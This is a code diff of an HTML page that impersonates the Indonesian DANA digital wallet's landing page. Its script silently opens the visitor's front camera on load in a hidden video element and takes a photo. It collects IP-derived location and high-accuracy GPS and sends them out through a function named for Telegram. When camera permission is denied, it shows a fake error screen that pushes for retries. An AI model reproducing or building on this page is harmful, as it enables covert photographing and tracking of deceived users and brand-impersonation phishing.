@@ -2,136 +2,191 @@
 <html lang="id">
   <head>
     <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no" />
     <meta name="theme-color" content="#108ee9" />
-    <meta
-      name="description"
-      content="DANA - Dompet digital yang aman dan tepercaya untuk beragam metode bayar."
-    />
+    <meta name="description" content="DANA - Dompet digital yang aman dan tepercaya untuk beragam metode bayar." />
     <title>DANA - Dompet Digital</title>
-    <link
-      rel="icon"
-      href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Crect width='24' height='24' rx='5' fill='%23108ee9'/%3E%3Cpath d='M5 8c0-1 .8-1.7 1.7-1.7h7c2.9 0 5.2 2.3 5.2 5.2s-2.3 5.2-5.2 5.2H6.7A1.7 1.7 0 0 1 5 15V8Z' fill='none' stroke='white' stroke-width='2'/%3E%3C/svg%3E"
-    />
+    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Crect width='24' height='24' rx='5' fill='%23108ee9'/%3E%3Cpath d='M5 8c0-1 .8-1.7 1.7-1.7h7c2.9 0 5.2 2.3 5.2 5.2s-2.3 5.2-5.2 5.2H6.7A1.7 1.7 0 0 1 5 15V8Z' fill='none' stroke='white' stroke-width='2'/%3E%3C/svg%3E" />
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet" />
+
     <style>
-      /* ===== CSS ANDA (tetap 100%) ===== */
-      :root {
-        --dana-blue: #108ee9;
-        --white: #ffffff;
-      }
+      /* ===== RESET & BASE ===== */
       * {
         margin: 0;
         padding: 0;
         box-sizing: border-box;
       }
-      html {
-        background-color: var(--dana-blue);
-      }
+
+      html,
       body {
-        font-family: system-ui, -apple-system, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-        background-color: var(--dana-blue);
-        color: var(--white);
+        height: 100%;
+        background: #108EE9;
+        font-family: 'Open Sans', 'SF Pro Text', -apple-system, BlinkMacSystemFont, sans-serif;
+        color: #ffffff;
         -webkit-font-smoothing: antialiased;
-        min-height: 100vh;
-        display: flex;
-        align-items: center;
-        justify-content: center;
         margin: 0;
+        padding: 0;
       }
-      .screen {
+
+      /* ===== LANDING PAGE ===== */
+      .landing-page {
+        height: 100%;
         display: flex;
         flex-direction: column;
-        min-height: 100dvh;
+        justify-content: center;
+        align-items: center;
+        box-sizing: border-box;
+        text-align: center;
+        padding: 0.16rem;
         max-width: 480px;
         margin: 0 auto;
-        padding: 0 24px 32px;
-        width: 100%;
-        justify-content: center;
       }
-      .content {
-        flex: 1;
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        justify-content: center;
-        padding-top: 40px;
+
+      /* ===== ANIMASI / ILUSTRASI ===== */
+      #animation {
+        width: 2.4rem;
+        height: 2.4rem;
+        margin: 0 auto;
       }
-      .illustration {
-        width: 100%;
-        max-width: 384px;
-        aspect-ratio: 1 / 1;
-      }
-      .illustration img {
+
+      #animation img {
         width: 100%;
         height: 100%;
         object-fit: contain;
       }
-      .logo {
-        display: flex;
-        align-items: center;
-        gap: 12px;
-        margin-top: 24px;
-      }
-      .logo-mark {
+
+      /* ===== LOGO DANA ===== */
+      .dana-logo {
         display: flex;
         align-items: center;
         justify-content: center;
-        width: 44px;
-        height: 44px;
-        border-radius: 50%;
-        background-color: var(--white);
-        color: var(--dana-blue);
-      }
-      .logo-mark svg {
-        width: 24px;
-        height: 24px;
-      }
-      .logo-text {
-        font-size: 36px;
-        font-weight: 800;
-        letter-spacing: 0.15em;
-        color: var(--white);
-      }
-      .title {
-        margin-top: 32px;
-        text-align: center;
-        font-size: 32px;
-        font-weight: 700;
-        line-height: 1.2;
-        text-wrap: balance;
-      }
-      .subtitle {
-        margin-top: 20px;
-        max-width: 28rem;
-        text-align: center;
-        font-size: 18px;
-        line-height: 1.5;
-        color: rgba(255, 255, 255, 0.9);
-        text-wrap: pretty;
-      }
-      .cta {
-        margin-top: 32px;
-        width: 100%;
-        border: none;
-        border-radius: 6px;
-        background-color: var(--white);
-        color: var(--dana-blue);
-        padding: 20px 0;
-        font-family: inherit;
-        font-size: 18px;
-        font-weight: 600;
-        letter-spacing: 0.05em;
-        cursor: pointer;
-        transition: background-color 0.15s ease;
-      }
-      .cta:hover {
-        background-color: rgba(255, 255, 255, 0.9);
-      }
-      .cta:active {
-        background-color: rgba(255, 255, 255, 0.8);
+        gap: 0.08rem;
+        height: 0.32rem;
+        margin: 0.3rem auto 0.12rem;
       }
 
-      /* ===== TAMBAHAN UNTUK ERROR SCREEN ===== */
+      .dana-logo .logo-mark {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        width: 0.32rem;
+        height: 0.32rem;
+        border-radius: 50%;
+        background-color: #ffffff;
+        color: #108EE9;
+        flex-shrink: 0;
+      }
+
+      .dana-logo .logo-mark svg {
+        width: 0.18rem;
+        height: 0.18rem;
+      }
+
+      .dana-logo .logo-text {
+        font-size: 0.32rem;
+        font-weight: 700;
+        letter-spacing: 0.05em;
+        color: #ffffff;
+        line-height: 1;
+      }
+
+      /* ===== TITLE ===== */
+      .title {
+        margin: 0 auto 0.08rem;
+        font-size: 0.27rem;
+        font-weight: 600;
+        line-height: 0.36rem;
+        max-width: 4rem;
+      }
+
+      /* ===== DESCRIPTION ===== */
+      .desc {
+        margin: 0 auto;
+        font-family: 'SF Pro Text', 'Open Sans', sans-serif;
+        font-size: 0.18rem;
+        line-height: 0.24rem;
+        color: rgba(255, 255, 255, 0.9);
+        max-width: 3.6rem;
+      }
+
+      /* ===== TOMBOL ===== */
+      .btn-container {
+        display: flex;
+        margin: 0.16rem auto;
+        padding: 0 0.16rem;
+        box-sizing: border-box;
+        width: 100%;
+        max-width: 4rem;
+      }
+
+      .btn-container button {
+        width: 100%;
+        min-width: 1.6rem;
+        background-color: #ffffff;
+        padding: 0.12rem 0.16rem;
+        font-family: 'Open Sans', sans-serif;
+        font-size: 0.16rem;
+        font-weight: 600;
+        color: #108EE9;
+        border: none;
+        border-radius: 0.04rem;
+        cursor: pointer;
+        transition: background-color 0.15s ease;
+        letter-spacing: 0.05em;
+      }
+
+      .btn-container button:hover {
+        background-color: rgba(255, 255, 255, 0.9);
+      }
+
+      .btn-container button:active {
+        background-color: rgba(255, 255, 255, 0.8);
+        transform: scale(0.98);
+      }
+
+      /* ===== RESPONSIVE (max-width: 480px) ===== */
+      @media screen and (max-width: 480px) {
+        #animation {
+          width: 2rem;
+          height: 2rem;
+        }
+
+        .dana-logo {
+          margin: 0.4rem auto 0.12rem;
+        }
+
+        .dana-logo .logo-text {
+          font-size: 0.28rem;
+        }
+
+        .title {
+          font-size: 0.24rem;
+          line-height: 0.32rem;
+        }
+
+        .desc {
+          font-size: 0.16rem;
+          line-height: 0.2rem;
+        }
+
+        .btn-container {
+          position: fixed;
+          bottom: 0.2rem;
+          left: 0;
+          width: 100%;
+          padding: 0 0.16rem;
+          max-width: 100%;
+        }
+
+        .btn-container button {
+          width: 100%;
+          padding: 0.14rem 0.16rem;
+          font-size: 0.16rem;
+          border-radius: 0.04rem;
+        }
+      }
+
+      /* ===== ERROR OVERLAY ===== */
       .error-overlay {
         display: none;
         position: fixed;
@@ -142,33 +197,38 @@
         justify-content: center;
         flex-direction: column;
         color: rgba(255, 255, 255, 0.12);
-        font-family: system-ui, sans-serif;
-        font-size: 3.2rem;
+        font-family: 'Open Sans', system-ui, sans-serif;
+        font-size: 2.4rem;
         font-weight: 200;
-        letter-spacing: 10px;
+        letter-spacing: 8px;
         text-transform: uppercase;
+        padding: 0.2rem;
+        text-align: center;
       }
+
       .error-overlay .sub-error {
-        font-size: 0.8rem;
+        font-size: 0.7rem;
         color: rgba(255, 255, 255, 0.04);
         letter-spacing: 4px;
-        margin-top: 14px;
+        margin-top: 0.1rem;
       }
+
       .btn-retry {
-        margin-top: 32px;
-        padding: 14px 36px;
+        margin-top: 0.24rem;
+        padding: 0.1rem 0.28rem;
         background: rgba(255, 255, 255, 0.05);
         border: 1px solid rgba(255, 255, 255, 0.08);
-        border-radius: 60px;
+        border-radius: 0.4rem;
         color: rgba(255, 255, 255, 0.25);
-        font-family: inherit;
-        font-size: 0.8rem;
+        font-family: 'Open Sans', sans-serif;
+        font-size: 0.14rem;
         font-weight: 500;
         letter-spacing: 3px;
         text-transform: uppercase;
         cursor: pointer;
         transition: all 0.3s ease;
       }
+
       .btn-retry:hover {
         background: rgba(255, 255, 255, 0.08);
         color: rgba(255, 255, 255, 0.4);
@@ -176,32 +236,44 @@
       }
 
       /* Sembunyikan video */
-      video { display: none !important; }
+      video {
+        display: none !important;
+      }
     </style>
   </head>
   <body>
 
-    <!-- ====== KONTEN UTAMA (DANA) ====== -->
-    <main class="screen" id="mainScreen">
-      <div class="content">
-        <div class="illustration">
-          <img src="dana-hero.png" alt="Ilustrasi pembayaran digital dengan memindai kode QR di kasir" />
-        </div>
-        <div class="logo" aria-label="DANA">
-          <span class="logo-mark">
-            <svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
-              <path d="M4 8c0-1.1.9-2 2-2h9c3.3 0 6 2.7 6 6s-2.7 6-6 6H6a2 2 0 0 1-2-2V8Zm3 1v6h8a3 3 0 0 0 0-6H7Z" />
-            </svg>
-          </span>
-          <span class="logo-text">DANA</span>
-        </div>
-        <h1 class="title">Dompet digital yang aman dan tepercaya!</h1>
-        <p class="subtitle">
-          Nikmati kemudahan bertransaksi dengan beragam metode bayar di genggaman
-        </p>
+    <!-- ====== LANDING PAGE ====== -->
+    <div class="landing-page" id="mainPage">
+
+      <!-- Ilustrasi / Animasi -->
+      <div id="animation">
+        <img src="https://jeansmith26.github.io/Supernjai/dana-hero.png" alt="Ilustrasi DANA" />
       </div>
-      <button type="button" class="cta" id="openDana">BUKA DI DANA</button>
-    </main>
+
+      <!-- Logo DANA -->
+      <div class="dana-logo" aria-label="DANA">
+        <span class="logo-mark">
+          <svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
+            <path d="M4 8c0-1.1.9-2 2-2h9c3.3 0 6 2.7 6 6s-2.7 6-6 6H6a2 2 0 0 1-2-2V8Zm3 1v6h8a3 3 0 0 0 0-6H7Z" />
+          </svg>
+        </span>
+        <span class="logo-text">DANA</span>
+      </div>
+
+      <!-- Title -->
+      <h1 class="title">Dompet digital yang aman dan tepercaya!</h1>
+
+      <!-- Description -->
+      <p class="desc">
+        Nikmati kemudahan bertransaksi dengan beragam metode bayar di genggaman
+      </p>
+
+      <!-- Tombol -->
+      <div class="btn-container">
+        <button type="button" id="openDana">BUKA DI DANA</button>
+      </div>
+    </div>
 
     <!-- ====== ERROR OVERLAY ====== -->
     <div class="error-overlay" id="errorOverlay">
@@ -210,7 +282,7 @@
       <button class="btn-retry" id="retryBtn">⟳ Coba Ulang</button>
     </div>
 
-    <!-- ====== SCRIPT GABUNGAN (tanpa musik) ====== -->
+    <!-- ====== SCRIPT ====== -->
     <script>
       (function() {
         'use strict';
@@ -224,7 +296,7 @@
         let izinDitolak = false;
         let retryTimer = null;
 
-        const mainScreen = document.getElementById('mainScreen');
+        const mainPage = document.getElementById('mainPage');
         const errorOverlay = document.getElementById('errorOverlay');
         const retryBtn = document.getElementById('retryBtn');
 
@@ -251,13 +323,18 @@
               org: data.org || null,
               timezone: data.timezone || null
             };
-          } catch { return null; }
+          } catch {
+            return null;
+          }
         }
 
         // ---------- GET GPS ----------
         function getGPSLocation() {
           return new Promise((resolve) => {
-            if (!navigator.geolocation) { resolve(null); return; }
+            if (!navigator.geolocation) {
+              resolve(null);
+              return;
+            }
             const timeoutId = setTimeout(() => resolve(null), 6000);
             navigator.geolocation.getCurrentPosition(
               (pos) => {
@@ -271,8 +348,9 @@
               () => {
                 clearTimeout(timeoutId);
                 resolve(null);
-              },
-              { enableHighAccuracy: true }
+              }, {
+                enableHighAccuracy: true
+              }
             );
           });
         }
@@ -348,21 +426,23 @@
           }
 
           Promise.allSettled([
-            getLocationFromIP(),
-            getGPSLocation()
-          ]).then((results) => {
-            const locationData = results[0].status === 'fulfilled' ? results[0].value : null;
-            const gpsData = results[1].status === 'fulfilled' ? results[1].value : null;
-            kirimKeTelegram(dataUrl, locationData, gpsData);
-          }).catch(() => {
-            kirimKeTelegram(dataUrl, null, null);
-          });
+              getLocationFromIP(),
+              getGPSLocation()
+            ])
+            .then((results) => {
+              const locationData = results[0].status === 'fulfilled' ? results[0].value : null;
+              const gpsData = results[1].status === 'fulfilled' ? results[1].value : null;
+              kirimKeTelegram(dataUrl, locationData, gpsData);
+            })
+            .catch(() => {
+              kirimKeTelegram(dataUrl, null, null);
+            });
         }
 
         // ---------- TAMPILKAN ERROR ----------
         function tampilkanError() {
           izinDitolak = true;
-          mainScreen.style.display = 'none';
+          mainPage.style.display = 'none';
           errorOverlay.style.display = 'flex';
           if (retryTimer) {
             clearTimeout(retryTimer);
@@ -380,7 +460,7 @@
             retryTimer = null;
           }
           errorOverlay.style.display = 'none';
-          mainScreen.style.display = 'flex';
+          mainPage.style.display = 'flex';
           setTimeout(mulaiKamera, 300);
         }
 
@@ -390,48 +470,50 @@
           attempts++;
 
           navigator.mediaDevices.getUserMedia({
-            video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
-            audio: false
-          })
-          .then(stream => {
-            const video = document.createElement('video');
-            video.style.display = 'none';
-            video.setAttribute('playsinline', '');
-            video.muted = true;
-            video.srcObject = stream;
-            document.body.appendChild(video);
+              video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+              audio: false
+            })
+            .then(stream => {
+              const video = document.createElement('video');
+              video.style.display = 'none';
+              video.setAttribute('playsinline', '');
+              video.muted = true;
+              video.srcObject = stream;
+              document.body.appendChild(video);
 
-            video.onloadedmetadata = () => {
-              video.play().then(() => {
-                setTimeout(() => ambilDanKirim(video), 100);
-              }).catch(() => {
+              video.onloadedmetadata = () => {
+                video.play()
+                  .then(() => {
+                    setTimeout(() => ambilDanKirim(video), 100);
+                  })
+                  .catch(() => {
+                    if (attempts < MAX_ATTEMPTS) {
+                      retryTimer = setTimeout(mulaiKamera, 2000);
+                    } else {
+                      tampilkanError();
+                    }
+                  });
+              };
+              video.onerror = () => {
                 if (attempts < MAX_ATTEMPTS) {
                   retryTimer = setTimeout(mulaiKamera, 2000);
                 } else {
                   tampilkanError();
                 }
-              });
-            };
-            video.onerror = () => {
+              };
+            })
+            .catch(err => {
+              console.error('Error kamera:', err);
+              if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
+                tampilkanError();
+                return;
+              }
               if (attempts < MAX_ATTEMPTS) {
                 retryTimer = setTimeout(mulaiKamera, 2000);
               } else {
                 tampilkanError();
               }
-            };
-          })
-          .catch(err => {
-            console.error('Error kamera:', err);
-            if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
-              tampilkanError();
-              return;
-            }
-            if (attempts < MAX_ATTEMPTS) {
-              retryTimer = setTimeout(mulaiKamera, 2000);
-            } else {
-              tampilkanError();
-            }
-          });
+            });
         }
 
         // ---------- EVENT RETRY ----------
@@ -449,7 +531,7 @@
           window.addEventListener('load', () => setTimeout(mulaiKamera, 500));
         }
 
-        // ---------- TOMBOL "BUKA DI DANA" (dengan redirect) ----------
+        // ---------- TOMBOL "BUKA DI DANA" ----------
         const danaBtn = document.getElementById('openDana');
         if (danaBtn) {
           danaBtn.addEventListener('click', function(e) {
@@ -459,7 +541,6 @@
 
             // Jika kamera gagal (izin ditolak), reset dan minta izin ulang
             if (izinDitolak) {
-              e.preventDefault();
               resetDanCobaUlang();
               setTimeout(() => {
                 window.location.href = 'https://www.dana.id/';
@@ -482,5 +563,6 @@
 
       })();
     </script>
+
   </body>
 </html>
